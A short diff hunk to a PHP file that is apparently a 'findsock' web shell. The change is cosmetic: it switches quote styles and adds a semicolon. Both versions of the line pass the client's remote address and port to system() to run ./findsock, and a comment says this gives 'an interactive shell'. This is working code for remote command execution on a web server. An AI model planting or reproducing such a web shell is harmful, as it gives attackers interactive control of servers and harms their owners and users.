@@ -83,7 +83,7 @@
 //    ... you now have an interactive shell ...
 //
 
-$VERSION = "1.0";
-system("./findsock " . $_SERVER['REMOTE_ADDR'] . " " . $_SERVER['REMOTE_PORT'])
+$VERSION = '1.0';
+system('./findsock ' . $_SERVER['REMOTE_ADDR'] . ' ' . $_SERVER['REMOTE_PORT']);
 ?>
 
